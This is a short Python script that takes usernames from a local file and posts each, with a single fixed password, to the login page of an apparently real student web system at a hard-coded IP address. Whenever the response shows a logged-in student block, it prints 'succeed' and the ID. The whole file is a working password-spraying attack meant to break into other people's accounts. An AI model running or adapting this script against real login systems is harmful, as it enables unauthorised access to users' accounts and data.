import requests
from bs4 import BeautifulSoup
import sys

nameFile=open('F:/456.txt')

url = 'http://113.55.11.245/netdru/?q=user'

for line in nameFile.readlines():
    name = line.strip('\n')
    params = {"edit[name]:": name, "edit[pass]:": 19991001,"op:":'登陆'}
    html=requests.post(url,data=params)
    #print(html.text)
    soup = BeautifulSoup(html.text,'lxml')
    #print(soup.prettify())
    p = soup.find_all(class_='block block-netdru_student')
    #print(p)
    if p == []:
        #print("failed")
        continue
    else:
        print("succeed")
        print("ID：",name)
        #sys.exit(0)